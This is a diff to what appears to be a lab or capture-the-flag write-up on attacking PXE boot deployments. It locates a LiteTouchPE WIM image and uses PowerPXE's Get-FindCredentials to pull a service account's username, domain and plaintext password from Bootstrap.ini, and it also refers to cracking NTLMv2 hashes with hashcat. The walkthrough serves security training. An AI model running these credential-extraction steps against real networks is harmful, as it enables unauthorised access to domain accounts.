@@ -98,4 +98,27 @@ hashtype 5600 is the NTLMv2-SSP hash within hashcat
 
 ![](screenshots/bcd_files.png)
 
+```
+x64{5A9A0409-4BCF-4484-A3F5-7673FBB0750E}.bcd
+```
 
+```
+>>>> Identify wim file : \Boot\x64\Images\LiteTouchPE_x64.wim 
+\Boot\x64\Images\LiteTouchPE_x64.wim
+```
+Now that we have the image we can use the Get-FindCredentials function of powerpxe to extract them
+
+```
+Get-FindCredentials -WimFile pxeboot.wim
+```
+![](screenshots/getcred_powerpxe.png)
+
+
+```
+>>>> Finding Bootstrap.ini 
+>>>> >>>> DeployRoot = \\THMMDT\MTDBuildLab$ 
+>>>> >>>> UserID = svcMDT 
+>>>> >>>> UserDomain = ZA
+>>>> >>>> UserPassword = PXEBootSecure1@
+
+```
